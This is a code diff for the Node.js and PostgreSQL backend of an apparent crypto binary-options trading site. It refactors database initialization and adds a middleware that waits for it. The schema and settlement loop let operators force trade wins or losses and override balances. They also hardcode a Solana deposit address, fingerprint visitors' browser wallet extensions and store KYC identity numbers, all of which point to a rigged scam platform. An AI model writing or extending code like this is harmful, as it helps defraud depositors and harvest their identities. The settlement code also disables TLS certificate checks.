@@ -62,6 +62,266 @@ const { Pool } = pg;
 let pool = null;
 let dbAvailable = false;
 let lastInitError = null;
+let dbInitPromise = null;
+
+const initializeDatabase = async () => {
+  if (!process.env.DATABASE_URL) return;
+  try {
+    console.log('[DB] Connecting to database...');
+    const client = await pool.connect();
+    console.log('[DB] Connection successful');
+    client.release();
+
+    // Step 1: Core Tables
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS geko_users (
+        id SERIAL PRIMARY KEY,
+        wallet_address TEXT UNIQUE,
+        nickname TEXT DEFAULT '',
+        email TEXT UNIQUE,
+        password TEXT,
+        invitation_code TEXT,
+        status TEXT DEFAULT 'guest',
+        wallet_data JSONB DEFAULT '{}',
+        trading_balance DECIMAL(24, 8) DEFAULT 0,
+        demo_balance DECIMAL(24, 8) DEFAULT 100000,
+        available_balance DECIMAL(24, 8) DEFAULT 0,
+        available_demo_balance DECIMAL(24, 8) DEFAULT 100000,
+        protocol_settlement_balance DECIMAL(24, 8) DEFAULT 0,
+        pending_deposit_currency TEXT DEFAULT 'BTC',
+        pending_deposit_amount DECIMAL(24, 8) DEFAULT 0,
+        last_seen TIMESTAMPTZ DEFAULT NOW(),
+        created_at TIMESTAMPTZ DEFAULT NOW()
+      )
+    `);
+
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS geko_config (
+        key TEXT PRIMARY KEY,
+        value TEXT,
+        updated_at TIMESTAMPTZ DEFAULT NOW()
+      )
+    `);
+
+    // Step 2: Columns one by one for maximum safety
+    const addColumn = async (name, type, def) => {
+      try {
+        await pool.query(`ALTER TABLE geko_users ADD COLUMN IF NOT EXISTS ${name} ${type} DEFAULT ${def}`);
+      } catch (e) {
+        console.warn(`[DB] Column ${name} may already exist or error:`, e.message);
+      }
+    };
+
+    await addColumn('nickname', 'TEXT', "''");
+    await addColumn('kyc_status', 'TEXT', "'none'");
+    await addColumn('force_win', 'BOOLEAN', 'FALSE');
+    await addColumn('last_interest_at', 'TIMESTAMPTZ', 'NOW()');
+    await addColumn('ip_address', 'TEXT', "''");
+    await addColumn('available_balance', 'DECIMAL(24, 8)', '0');
+    await addColumn('available_demo_balance', 'DECIMAL(24, 8)', '100000');
+    await addColumn('balance_override', 'TEXT', "''");
+    await addColumn('referral_code', 'TEXT', "''");
+    await addColumn('referred_by', 'TEXT', "''");
+    await addColumn('protocol_settlement_balance', 'DECIMAL(24, 8)', '0');
+    await addColumn('trading_balance', 'DECIMAL(24, 8)', '0');
+    await addColumn('demo_balance', 'DECIMAL(24, 8)', '100000');
+    await addColumn('email', 'TEXT', "NULL");
+    await addColumn('password', 'TEXT', "NULL");
+    await addColumn('invitation_code', 'TEXT', "NULL");
+    await addColumn('status', 'TEXT', "'guest'");
+    await addColumn('pending_deposit_currency', 'TEXT', "'BTC'");
+    await addColumn('pending_deposit_amount', 'DECIMAL(24, 8)', '0');
+
+    // Step 3: Constraints & Cleanup
+    await pool.query(`
+      DO $$ 
+      BEGIN 
+        IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_wallet_address_key') THEN
+          BEGIN
+            DELETE FROM geko_users a USING geko_users b
+            WHERE a.id < b.id AND a.wallet_address = b.wallet_address;
+            ALTER TABLE geko_users ADD CONSTRAINT geko_users_wallet_address_key UNIQUE (wallet_address);
+          EXCEPTION WHEN OTHERS THEN
+            RAISE NOTICE 'Could not add unique constraint on wallet_address';
+          END;
+        END IF;
+        IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_email_key') THEN
+          BEGIN
+            ALTER TABLE geko_users ADD CONSTRAINT geko_users_email_key UNIQUE (email);
+          EXCEPTION WHEN OTHERS THEN
+            RAISE NOTICE 'Could not add unique constraint on email';
+          END;
+        END IF;
+      END $$;
+    `);
+
+    // Step 4: Defaults & Defaults Config
+    try {
+      await pool.query(`
+        UPDATE geko_users SET trading_balance = COALESCE(trading_balance, 0) WHERE trading_balance IS NULL;
+        UPDATE geko_users SET demo_balance = COALESCE(demo_balance, 100000) WHERE demo_balance IS NULL;
+        UPDATE geko_users SET protocol_settlement_balance = COALESCE(protocol_settlement_balance, 0) WHERE protocol_settlement_balance IS NULL;
+      `);
+    } catch (e) {
+      console.warn('[DB] Non-critical default update failed:', e.message);
+    }
+
+    await pool.query(`
+      INSERT INTO geko_config (key, value)
+      VALUES ('solana_deposit_address', '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw')
+      ON CONFLICT (key) DO NOTHING
+    `);
+
+    await pool.query(`CREATE INDEX IF NOT EXISTS idx_users_wallet ON geko_users (wallet_address)`);
+    await pool.query(`CREATE INDEX IF NOT EXISTS idx_users_last_seen ON geko_users (last_seen)`);
+
+    // Step 5: Secondary Tables
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS trades (
+        id TEXT PRIMARY KEY,
+        wallet_address TEXT NOT NULL,
+        symbol TEXT NOT NULL,
+        direction TEXT NOT NULL,
+        amount DECIMAL(24, 8) NOT NULL,
+        entry_price DECIMAL(24, 8) NOT NULL,
+        duration INTEGER NOT NULL,
+        status TEXT DEFAULT 'pending',
+        force_outcome TEXT,
+        is_demo BOOLEAN DEFAULT FALSE,
+        created_at TIMESTAMPTZ DEFAULT NOW(),
+        settled_at TIMESTAMPTZ
+      )
+    `);
+
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS withdrawal_requests (
+        id SERIAL PRIMARY KEY,
+        wallet_address TEXT NOT NULL,
+        destination_address TEXT NOT NULL,
+        amount DECIMAL(24, 8) NOT NULL,
+        asset TEXT NOT NULL DEFAULT 'SOL',
+        status TEXT NOT NULL DEFAULT 'pending',
+        tx_signature TEXT,
+        admin_note TEXT,
+        created_at TIMESTAMPTZ DEFAULT NOW(),
+        processed_at TIMESTAMPTZ
+      )
+    `);
+
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS transactions (
+        id SERIAL PRIMARY KEY,
+        wallet_address TEXT NOT NULL,
+        asset_symbol TEXT NOT NULL,
+        amount DECIMAL(24, 8) NOT NULL,
+        type TEXT NOT NULL,
+        status TEXT NOT NULL DEFAULT 'completed',
+        payment_id TEXT,
+        tx_signature TEXT,
+        reference TEXT,
+        created_at TIMESTAMPTZ DEFAULT NOW()
+      )
+    `);
+
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS geko_visitors (
+        id SERIAL PRIMARY KEY,
+        visitor_id TEXT,
+        ip_address TEXT,
+        user_agent TEXT,
+        language TEXT,
+        timezone TEXT,
+        screen_size TEXT,
+        platform TEXT,
+        referrer TEXT,
+        page_path TEXT,
+        wallet_extensions JSONB DEFAULT '[]',
+        visit_count INTEGER DEFAULT 1,
+        first_seen TIMESTAMPTZ DEFAULT NOW(),
+        last_seen TIMESTAMPTZ DEFAULT NOW()
+      )
+    `);
+
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS support_tickets (
+        id SERIAL PRIMARY KEY,
+        wallet_address TEXT NOT NULL,
+        subject TEXT NOT NULL,
+        messages JSONB DEFAULT '[]',
+        status TEXT DEFAULT 'open',
+        created_at TIMESTAMPTZ DEFAULT NOW(),
+        updated_at TIMESTAMPTZ DEFAULT NOW()
+      )
+    `);
+
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS kyc_submissions (
+        id SERIAL PRIMARY KEY,
+        wallet_address TEXT NOT NULL,
+        full_name TEXT,
+        date_of_birth TEXT,
+        country TEXT,
+        id_type TEXT,
+        id_number TEXT,
+        status TEXT DEFAULT 'pending',
+        admin_note TEXT,
+        created_at TIMESTAMPTZ DEFAULT NOW()
+      )
+    `);
+
+    dbAvailable = true;
+    console.log('[DB] Database fully initialized and ready.');
+    
+    // Server-side trade settlement loop
+    setInterval(async () => {
+      if (!dbAvailable || !pool) return;
+      try {
+        const res = await pool.query(
+          "SELECT * FROM trades WHERE status = 'pending' AND created_at <= NOW() - (duration || ' seconds')::interval"
+        );
+        for (const trade of res.rows) {
+          console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
+          let isWin = false;
+          if (trade.force_outcome === 'win') isWin = true;
+          else if (trade.force_outcome === 'loss') isWin = false;
+          else isWin = Math.random() > 0.45;
+
+          const payout = isWin ? parseFloat(trade.amount) * 1.85 : 0;
+          const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
+
+          await pool.query(
+            "UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2",
+            [isWin ? 'won' : 'lost', trade.id]
+          );
+
+          if (payout > 0) {
+            await pool.query(
+              `UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`,
+              [payout, trade.wallet_address]
+            );
+            await recordTransaction({
+              wallet_address: trade.wallet_address,
+              asset_symbol: 'USDT',
+              amount: payout,
+              type: 'trade',
+              reference: `trade-auto-settle:${trade.id}`
+            });
+          }
+        }
+      } catch (e) {
+        console.error('[Auto-Settle Error]', e.message);
+      }
+    }, 5000);
+
+    setInterval(processDailyInterest, 60 * 60 * 1000); 
+    processDailyInterest();
+  } catch (err) {
+    console.error('[DB Error] CRITICAL initialization failure:', err.message);
+    console.error(err.stack);
+    lastInitError = err.message;
+    dbAvailable = false;
+  }
+};
 
 if (process.env.DATABASE_URL) {
   const maskedUrl = process.env.DATABASE_URL.replace(/:([^:@]+)@/, ':****@');
@@ -72,271 +332,15 @@ if (process.env.DATABASE_URL) {
     ssl: { rejectUnauthorized: false }
   });
 
-  const initializeDatabase = async () => {
-    try {
-      console.log('[DB] Connecting to database...');
-      const client = await pool.connect();
-      console.log('[DB] Connection successful');
-      client.release();
-
-      // Step 1: Core Tables
-      await pool.query(`
-        CREATE TABLE IF NOT EXISTS geko_users (
-          id SERIAL PRIMARY KEY,
-          wallet_address TEXT UNIQUE,
-          nickname TEXT DEFAULT '',
-          email TEXT UNIQUE,
-          password TEXT,
-          invitation_code TEXT,
-          status TEXT DEFAULT 'guest',
-          wallet_data JSONB DEFAULT '{}',
-          trading_balance DECIMAL(24, 8) DEFAULT 0,
-          demo_balance DECIMAL(24, 8) DEFAULT 100000,
-          available_balance DECIMAL(24, 8) DEFAULT 0,
-          available_demo_balance DECIMAL(24, 8) DEFAULT 100000,
-          protocol_settlement_balance DECIMAL(24, 8) DEFAULT 0,
-          pending_deposit_currency TEXT DEFAULT 'BTC',
-          pending_deposit_amount DECIMAL(24, 8) DEFAULT 0,
-          last_seen TIMESTAMPTZ DEFAULT NOW(),
-          created_at TIMESTAMPTZ DEFAULT NOW()
-        )
-      `);
-
-      await pool.query(`
-        CREATE TABLE IF NOT EXISTS geko_config (
-          key TEXT PRIMARY KEY,
-          value TEXT,
-          updated_at TIMESTAMPTZ DEFAULT NOW()
-        )
-      `);
-
-      // Step 2: Columns one by one for maximum safety
-      const addColumn = async (name, type, def) => {
-        try {
-          await pool.query(`ALTER TABLE geko_users ADD COLUMN IF NOT EXISTS ${name} ${type} DEFAULT ${def}`);
-        } catch (e) {
-          console.warn(`[DB] Column ${name} may already exist or error:`, e.message);
-        }
-      };
-
-      await addColumn('nickname', 'TEXT', "''");
-      await addColumn('kyc_status', 'TEXT', "'none'");
-      await addColumn('force_win', 'BOOLEAN', 'FALSE');
-      await addColumn('last_interest_at', 'TIMESTAMPTZ', 'NOW()');
-      await addColumn('ip_address', 'TEXT', "''");
-      await addColumn('available_balance', 'DECIMAL(24, 8)', '0');
-      await addColumn('available_demo_balance', 'DECIMAL(24, 8)', '100000');
-      await addColumn('balance_override', 'TEXT', "''");
-      await addColumn('referral_code', 'TEXT', "''");
-      await addColumn('referred_by', 'TEXT', "''");
-      await addColumn('protocol_settlement_balance', 'DECIMAL(24, 8)', '0');
-      await addColumn('trading_balance', 'DECIMAL(24, 8)', '0');
-      await addColumn('demo_balance', 'DECIMAL(24, 8)', '100000');
-      await addColumn('email', 'TEXT', "NULL");
-      await addColumn('password', 'TEXT', "NULL");
-      await addColumn('invitation_code', 'TEXT', "NULL");
-      await addColumn('status', 'TEXT', "'guest'");
-      await addColumn('pending_deposit_currency', 'TEXT', "'BTC'");
-      await addColumn('pending_deposit_amount', 'DECIMAL(24, 8)', '0');
-
-      // Step 3: Constraints & Cleanup
-      await pool.query(`
-        DO $$ 
-        BEGIN 
-          IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_wallet_address_key') THEN
-            BEGIN
-              DELETE FROM geko_users a USING geko_users b
-              WHERE a.id < b.id AND a.wallet_address = b.wallet_address;
-              ALTER TABLE geko_users ADD CONSTRAINT geko_users_wallet_address_key UNIQUE (wallet_address);
-            EXCEPTION WHEN OTHERS THEN
-              RAISE NOTICE 'Could not add unique constraint on wallet_address';
-            END;
-          END IF;
-          IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_email_key') THEN
-            BEGIN
-              ALTER TABLE geko_users ADD CONSTRAINT geko_users_email_key UNIQUE (email);
-            EXCEPTION WHEN OTHERS THEN
-              RAISE NOTICE 'Could not add unique constraint on email';
-            END;
-          END IF;
-        END $$;
-      `);
-
-      // Step 4: Defaults & Defaults Config
-      try {
-        await pool.query(`
-          UPDATE geko_users SET trading_balance = COALESCE(trading_balance, 0) WHERE trading_balance IS NULL;
-          UPDATE geko_users SET demo_balance = COALESCE(demo_balance, 100000) WHERE demo_balance IS NULL;
-          UPDATE geko_users SET protocol_settlement_balance = COALESCE(protocol_settlement_balance, 0) WHERE protocol_settlement_balance IS NULL;
-        `);
-      } catch (e) {
-        console.warn('[DB] Non-critical default update failed:', e.message);
-      }
-
-      await pool.query(`
-        INSERT INTO geko_config (key, value)
-        VALUES ('solana_deposit_address', '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw')
-        ON CONFLICT (key) DO NOTHING
-      `);
-
-      await pool.query(`CREATE INDEX IF NOT EXISTS idx_users_wallet ON geko_users (wallet_address)`);
-      await pool.query(`CREATE INDEX IF NOT EXISTS idx_users_last_seen ON geko_users (last_seen)`);
-
-      // Step 5: Secondary Tables
-      await pool.query(`
-        CREATE TABLE IF NOT EXISTS trades (
-          id TEXT PRIMARY KEY,
-          wallet_address TEXT NOT NULL,
-          symbol TEXT NOT NULL,
-          direction TEXT NOT NULL,
-          amount DECIMAL(24, 8) NOT NULL,
-          entry_price DECIMAL(24, 8) NOT NULL,
-          duration INTEGER NOT NULL,
-          status TEXT DEFAULT 'pending',
-          force_outcome TEXT,
-          is_demo BOOLEAN DEFAULT FALSE,
-          created_at TIMESTAMPTZ DEFAULT NOW(),
-          settled_at TIMESTAMPTZ
-        )
-      `);
-
-      await pool.query(`
-        CREATE TABLE IF NOT EXISTS withdrawal_requests (
-          id SERIAL PRIMARY KEY,
-          wallet_address TEXT NOT NULL,
-          destination_address TEXT NOT NULL,
-          amount DECIMAL(24, 8) NOT NULL,
-          asset TEXT NOT NULL DEFAULT 'SOL',
-          status TEXT NOT NULL DEFAULT 'pending',
-          tx_signature TEXT,
-          admin_note TEXT,
-          created_at TIMESTAMPTZ DEFAULT NOW(),
-          processed_at TIMESTAMPTZ
-        )
-      `);
-
-      await pool.query(`
-        CREATE TABLE IF NOT EXISTS transactions (
-          id SERIAL PRIMARY KEY,
-          wallet_address TEXT NOT NULL,
-          asset_symbol TEXT NOT NULL,
-          amount DECIMAL(24, 8) NOT NULL,
-          type TEXT NOT NULL,
-          status TEXT NOT NULL DEFAULT 'completed',
-          payment_id TEXT,
-          tx_signature TEXT,
-          reference TEXT,
-          created_at TIMESTAMPTZ DEFAULT NOW()
-        )
-      `);
-
-      await pool.query(`
-        CREATE TABLE IF NOT EXISTS geko_visitors (
-          id SERIAL PRIMARY KEY,
-          visitor_id TEXT,
-          ip_address TEXT,
-          user_agent TEXT,
-          language TEXT,
-          timezone TEXT,
-          screen_size TEXT,
-          platform TEXT,
-          referrer TEXT,
-          page_path TEXT,
-          wallet_extensions JSONB DEFAULT '[]',
-          visit_count INTEGER DEFAULT 1,
-          first_seen TIMESTAMPTZ DEFAULT NOW(),
-          last_seen TIMESTAMPTZ DEFAULT NOW()
-        )
-      `);
-
-      await pool.query(`
-        CREATE TABLE IF NOT EXISTS support_tickets (
-          id SERIAL PRIMARY KEY,
-          wallet_address TEXT NOT NULL,
-          subject TEXT NOT NULL,
-          messages JSONB DEFAULT '[]',
-          status TEXT DEFAULT 'open',
-          created_at TIMESTAMPTZ DEFAULT NOW(),
-          updated_at TIMESTAMPTZ DEFAULT NOW()
-        )
-      `);
-
-      await pool.query(`
-        CREATE TABLE IF NOT EXISTS kyc_submissions (
-          id SERIAL PRIMARY KEY,
-          wallet_address TEXT NOT NULL,
-          full_name TEXT,
-          date_of_birth TEXT,
-          country TEXT,
-          id_type TEXT,
-          id_number TEXT,
-          status TEXT DEFAULT 'pending',
-          admin_note TEXT,
-          created_at TIMESTAMPTZ DEFAULT NOW()
-        )
-      `);
-
-      dbAvailable = true;
-      console.log('[DB] Database fully initialized and ready.');
-      
-      // Server-side trade settlement loop
-      setInterval(async () => {
-        if (!dbAvailable || !pool) return;
-        try {
-          const res = await pool.query(
-            "SELECT * FROM trades WHERE status = 'pending' AND created_at <= NOW() - (duration || ' seconds')::interval"
-          );
-          for (const trade of res.rows) {
-            console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
-            let isWin = false;
-            if (trade.force_outcome === 'win') isWin = true;
-            else if (trade.force_outcome === 'loss') isWin = false;
-            else isWin = Math.random() > 0.45;
-
-            const payout = isWin ? parseFloat(trade.amount) * 1.85 : 0;
-            const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
-
-            await pool.query(
-              "UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2",
-              [isWin ? 'won' : 'lost', trade.id]
-            );
-
-            if (payout > 0) {
-              await pool.query(
-                `UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`,
-                [payout, trade.wallet_address]
-              );
-              await recordTransaction({
-                wallet_address: trade.wallet_address,
-                asset_symbol: 'USDT',
-                amount: payout,
-                type: 'trade',
-                reference: `trade-auto-settle:${trade.id}`
-              });
-            }
-          }
-        } catch (e) {
-          console.error('[Auto-Settle Error]', e.message);
-        }
-      }, 5000);
-
-      setInterval(processDailyInterest, 60 * 60 * 1000); 
-      processDailyInterest();
-    } catch (err) {
-      console.error('[DB Error] CRITICAL initialization failure:', err.message);
-      console.error(err.stack);
-      lastInitError = err.message;
-      dbAvailable = false;
-    }
-  };
-
-  initializeDatabase();
+  dbInitPromise = initializeDatabase();
 } else { 
   console.warn('DATABASE_URL is not set in .env. Database features will be unavailable.');
 }
 
 // ─── Health check ──────────────────────────────────────────────────────────
 app.get('/api/health', async (req, res) => {
+  if (dbInitPromise) await dbInitPromise.catch(() => {});
+  
   let dbStatus = dbAvailable ? 'CONNECTED ✅' : 'DISCONNECTED ❌';
   let userCount = 0;
   let lastError = null;
@@ -362,6 +366,22 @@ app.get('/api/health', async (req, res) => {
     error: lastError || lastInitError,
     time: new Date().toISOString() 
   });
+});
+
+// ─── Global Database Wait Middleware ──────────────────────────────────────
+app.use(async (req, res, next) => {
+  if (dbInitPromise && req.url.startsWith('/api')) {
+    try {
+      // Wait for initialization but don't block forever (max 15s for Vercel)
+      const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('DB_INIT_TIMEOUT')), 15000));
+      await Promise.race([dbInitPromise, timeout]).catch(err => {
+        console.warn('[DB Middleware] Initialization check timed out or failed:', err.message);
+      });
+    } catch (e) {
+      console.error('[DB Middleware] Error awaiting initialization:', e.message);
+    }
+  }
+  next();
 });
 
 // ─── Shared Utilities ──────────────────────────────────────────────────────
